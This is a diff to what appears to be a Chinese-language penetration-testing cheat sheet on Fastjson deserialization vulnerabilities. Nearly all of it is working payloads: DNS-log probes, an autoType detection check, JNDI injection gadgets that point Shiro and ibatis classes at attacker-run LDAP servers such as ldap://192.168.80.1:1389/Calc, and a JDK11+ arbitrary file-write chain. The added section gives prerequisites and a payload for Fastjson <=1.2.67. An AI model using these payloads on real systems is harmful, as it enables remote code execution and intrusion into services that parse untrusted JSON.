@@ -75,7 +75,7 @@ Fastjson 1.2.36 - 1.2.62
 }
 ```
 参考https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA
- 
+
 ### dns探测
 
 主要是利用各个类被加入黑名单的方式进行判断，但此方法准确性不高。   
@@ -95,12 +95,12 @@ fastjson <1.2.48
 {"@type":"java.net.InetAddress","val":"dnslog"}
 ```
 
-fastjson <1.2.68
+fastjson <1.2.83
 
 ```java
-{"@type":"java.net.Inet4Address","val":"dnslog"}
+
 {"@type":"java.net.Inet6Address","val":"dnslog"}
-{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
+{{"@type":"java.net.URL","val":"http://dnslog"}:"aaa"}
 {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
 Set[{"@type":"java.net.URL","val":"http://dnslog"}]
 Set[{"@type":"java.net.URL","val":"http://dnslog"}
@@ -108,8 +108,10 @@ Set[{"@type":"java.net.URL","val":"http://dnslog"}
 {{"@type":"java.net.URL","val":"http://dnslog"}:0
 ```
 
+
 精确探索autoType是否开启，开启后能打更多payload
 https://github.com/pen4uin/awesome-java-security/tree/main/alibaba%20fastjson
+
 ```
 [{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"ydk3cz.dnslog.cn"}]
 ```
@@ -688,7 +690,6 @@ poc:
 
 
 ```java
-{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
 {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/Exploit"], "Realms":[""]}
 
 
@@ -702,6 +703,19 @@ poc:
 {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1399/Calc"}}
 ```
 
+### fastjson<=1.2.67
+
+
+### 前提条件
+
+- 开启AutoType；
+- Fastjson <= 1.2.67；
+- JNDI注入利用所受的JDK版本限制；
+- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
+
+```java
+{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc","instance":{"$ref":"$.instance"}}
+```
 
 
 适用于jdk11以上版本的写文件的payload：
@@ -714,7 +728,7 @@ poc:
         "@type": "java.util.zip.InflaterOutputStream",
         "out": {
            "@type": "java.io.FileOutputStream",
-           "file": "/tmp/asdasd",
+           "file": "writefile",
            "append": true
         },
         "infl": {
